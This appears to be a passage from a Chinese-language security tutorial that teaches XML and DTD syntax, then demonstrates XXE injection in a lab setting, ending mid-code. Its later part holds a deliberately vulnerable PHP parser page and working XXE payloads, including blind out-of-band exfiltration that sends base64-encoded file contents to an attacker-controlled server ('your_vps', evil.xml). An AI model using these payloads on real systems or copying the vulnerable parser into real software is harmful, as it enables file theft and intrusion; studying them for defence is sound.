class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上 DTD 解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</span><br><span class="line"></span><br><span class="line">!ELEMENT note (第三行)定义 note 元素有四个元素：&quot;to、from、heading、body&quot;</span><br><span class="line"></span><br><span class="line">!ELEMENT to (第四行)定义 to 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT from (第五行)定义 from 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT heading (第六行)定义 heading 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line"></span><br><span class="line">!ELEMENT body (第七行)定义 body 元素为 &quot;#PCDATA&quot; 类型</span><br></pre></td></tr></table></figure><h6 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a><strong>外部文档声明</strong></h6><p>DTD被包含在XML源头部的表现定义形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a><strong>实例</strong></h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x002-构建模块"><a href="#0x002-构建模块" class="headerlink" title="0x002 构建模块"></a>0x002 构建模块</h4><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA</li><li>CDATA</li></ul><h4 id="0x003元素"><a href="#0x003元素" class="headerlink" title="0x003元素"></a>0x003元素</h4><p>元素是 XML 以及 HTML 文档的<em>主要构建模块</em>。</p><p>HTML 元素的例子是 “body” 和 “table”。XML 元素的例子是 “note” 和 “message” 。元素可包含文本、其他元素或者是空的。空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 类别&gt;</span><br><span class="line">或</span><br><span class="line">&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br></pre></td></tr></table></figure><h4 id="0x004属性"><a href="#0x004属性" class="headerlink" title="0x004属性"></a>0x004属性</h4><p>属性可提供<em>有关元素的额外信息</em>。</p><p>属性总是被置于某元素的开始标签中。属性总是以<em>名称&#x2F;值</em>的形式成对出现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; /&gt; 分别为&lt;元素 属性=&quot;属性的值&quot; /&gt;</span><br></pre></td></tr></table></figure><p>属性声明使用下列语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><h4 id="0X005-DTD实体"><a href="#0X005-DTD实体" class="headerlink" title="0X005 DTD实体"></a>0X005 DTD实体</h4><ul><li><p>实体是用来定义普通文本的变量。</p></li><li><p>实体引用是对实体的引用。</p></li><li><p>大多数同学都了解这个 HTML 实体引用：”&nbsp;”。这个“无折行空格”实体在 HTML 中被用于在某个文档中插入一个额外的空格。</p></li><li><p>当文档被 XML 解析器解析时，实体就会被展开。</p></li><li><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p></li><li><p>可以内部声明或外部引用。</p></li><li><p>实体又分为一般实体和参数实体</p><p>1.一般实体的声明语法:</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；<br>2.参数实体只能在DTD中使用，参数实体的声明格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容“&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：%实体名；<br><strong>一般实体指代的是将来XML数据文档要用到的文本或数据，而参数实体是在DTD文档内定义的一种DTD信息，所代表的是DTD定义的一部分，不能在XML文档中使用，也不能在DTD中定义。</strong></p><h6 id="内部一般实体声明"><a href="#内部一般实体声明" class="headerlink" title="内部一般实体声明"></a>内部一般实体声明</h6><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; </span><br></pre></td></tr></table></figure><h6 id="外部一般实体声明"><a href="#外部一般实体声明" class="headerlink" title="外部一般实体声明"></a>外部一般实体声明</h6><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; </span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; </span><br></pre></td></tr></table></figure><h6 id="内部参数实体"><a href="#内部参数实体" class="headerlink" title="内部参数实体"></a>内部参数实体</h6><p>参数实体不能被应用在元素的声明当中，不能使用参数实体来定义元素，只有在外部DTD中参数实体才能被应用到元素的声明当中。<br><code>test1.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE person SYSTEM &quot;test1.dtd&quot;&gt;  </span><br><span class="line">&lt;person&gt;  </span><br><span class="line">    &lt;name&gt;Jason&lt;/name&gt;  </span><br><span class="line">    &lt;addr&gt;Shanghai&lt;/addr&gt;  </span><br><span class="line">    &lt;tel&gt;18701772821&lt;/tel&gt;  </span><br><span class="line">    &lt;br/&gt;  </span><br><span class="line">    &lt;email&gt;18701772821@163.com&lt;/email&gt;  </span><br><span class="line">&lt;/person&gt;  </span><br></pre></td></tr></table></figure><p><code>test1.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;  </span><br><span class="line">&lt;!ELEMENT addr %name;&gt;  </span><br><span class="line">&lt;!ELEMENT tel %name;&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email %name;&gt;  </span><br></pre></td></tr></table></figure><p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p><h6 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h6><p>能将原来很长的DTD文档转变成一个很小的、相互调用的文档集合，适合大型DTD文档的设计开发。<br><code>test1.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE person [  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY % （注意这里有个空格）content SYSTEM &quot;test1.dtd&quot;&gt;  </span><br><span class="line">%content;  </span><br><span class="line">]&gt;  </span><br><span class="line">&lt;person&gt;  </span><br><span class="line">    &lt;name&gt;Jason&lt;/name&gt;  </span><br><span class="line">    &lt;addr&gt;Shanghai&lt;/addr&gt;  </span><br><span class="line">    &lt;tel&gt;18701772821&lt;/tel&gt;  </span><br><span class="line">    &lt;br/&gt;  </span><br><span class="line">    &lt;email&gt;18701772821@163.com&lt;/email&gt;  </span><br><span class="line">&lt;/person&gt;  </span><br></pre></td></tr></table></figure><p><code>test1.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT addr (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT tel (#PCDATA)&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email (#PCDATA)&gt;  </span><br></pre></td></tr></table></figure><h4 id="0x006-PCDATA"><a href="#0x006-PCDATA" class="headerlink" title="0x006 PCDATA"></a>0x006 PCDATA</h4><ul><li>PCDATA 的意思是被解析的字符数据（parsed character data）。</li><li>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</li><li>PCDATA 是会被解析器解析的文本。</li><li>这些文本将被解析器检查实体以及标记。</li><li>文本中的标签会被当作标记来处理，而实体会被展开。</li><li>被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；</li><li>需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</li></ul><h4 id="0x007-CDATA"><a href="#0x007-CDATA" class="headerlink" title="0x007 CDATA"></a>0x007 CDATA</h4><ul><li>CDATA 的意思是字符数据（character data）。</li><li>CDATA 是不会被解析器解析的文本。</li><li>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</li></ul><h2 id="0x04-XML实体注入实例"><a href="#0x04-XML实体注入实例" class="headerlink" title="0x04 XML实体注入实例"></a>0x04 XML实体注入实例</h2><blockquote><p>找一台服务器，一台本地主机，服务器作为靶机测试</p></blockquote><h4 id="0x001-有回显测试"><a href="#0x001-有回显测试" class="headerlink" title="0x001 有回显测试"></a>0x001 有回显测试</h4><p>在靶机新建test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">//simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>123.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test succeed</span><br></pre></td></tr></table></figure><h6 id="外部实体读取文件"><a href="#外部实体读取文件" class="headerlink" title="外部实体读取文件"></a>外部实体读取文件</h6><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机ip?xml=&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file://123.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;note&gt;&amp;file;&lt;/note&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>读取靶机123.txt回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement Object ( [file] =&gt; SimpleXMLElement Object ( [file] =&gt; test succeed )</span><br></pre></td></tr></table></figure><h6 id="引用DTD文件"><a href="#引用DTD文件" class="headerlink" title="引用DTD文件"></a>引用DTD文件</h6><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机ip?xml=&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE note [&lt;!ENTITY % a SYSTEM &quot;http://192.168.86.128/dtdfile.dtd&quot;&gt; %a;]&gt;</span><br><span class="line"> &lt;note&gt;&amp;file;&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>在本机新建dtd文件(dtdfile.dtd):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file SYSTEM &quot;file://123.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>读取靶机123.txt回显：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement Object ( [file] =&gt; SimpleXMLElement Object ( [file] =&gt; test succeed )</span><br></pre></td></tr></table></figure><h4 id="0x002-无回显测试"><a href="#0x002-无回显测试" class="headerlink" title="0x002 无回显测试"></a>0x002 无回显测试</h4><p>可以将结果打到服务器上，查看日志，或则将结果保存为文件</p><h6 id="引用远程服务器上的XML文件读取文件"><a href="#引用远程服务器上的XML文件读取文件" class="headerlink" title="引用远程服务器上的XML文件读取文件"></a>引用远程服务器上的XML文件读取文件</h6><p>payload:</p><p>xxe.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your_vps/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://your_vps/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意:<strong>参数实体引用不能出现在内部DTD的标记声明内部</strong></p><blockquote><p>在内部DTD中引入参数实体不能写在标记声明内部，但可写在DTD中标记出现的地方，也就是标记外。</p><p>如果想在DTD标记声明中引入参数实体，那么就必须用外部DTD。</p></blockquote><p><strong>使用的<a href="https://link.jianshu.com/?t=php://filter">php:&#x2F;&#x2F;filter</a>将文件内容进行了base64编码，因为当我们读取的文件是php或则html文件时，文件的代码包含<code>&lt;</code> <code>&gt;</code>符号时会导致解析错误</strong><br><strong>这里声明payload实体参数，该实体参数以base64编码方式读取了靶机中123.txt文件内容，然后做为URL参数请求到自己的服务器上。</strong></p><h2 id="0x05-XXE"><a href="#0x05-XXE" class="headerlink" title="0x05 XXE"></a>0x05 XXE</h2><h4 id="0x001-Blind-XXE原理"><a href="#0x001-Blind-XXE原理" class="headerlink" title="0x001 Blind XXE原理"></a>0x001 Blind XXE原理</h4><p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p><h4 id="0x002-误区"><a href="#0x002-误区" class="headerlink" title="0x002 误区"></a>0x002 误区</h4><p>直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param2</span> <span class="string">&quot;http://127.0.0.1/?%param1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>内部实体嵌套的形式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">param2</span> <span class="string">&quot;&lt;!ENTITY % param222 SYSTEM&#x27;http://127.0.0.1/?%param1;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">[This is my site]</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</strong></p><h4 id="0x003-误区解决方案"><a href="#0x003-误区解决方案" class="headerlink" title="0x003 误区解决方案"></a>0x003 误区解决方案</h4><p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p><p>如下：</p><p>source file</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.150.1/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实体remote，all，send的引用顺序很重要:</p><ul><li>首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，</li><li>然后执行%all，</li><li>这时会检测到send实体，</li><li>在root节点中引用send，</li><li>就可以成功实现数据转发。</li></ul><p>当然，也直接在DTD中引用send实体，<strong>如果在evil.xml中，send是个参数实体的话</strong>，即以下方式：</p><p>source file</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.150.1/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta"> %all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x004-攻击测试"><a href="#0x004-攻击测试" class="headerlink" title="0x004 攻击测试"></a>0x004 攻击测试</h4><blockquote><p>攻击机：本机，靶机：服务器</p></blockquote><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE 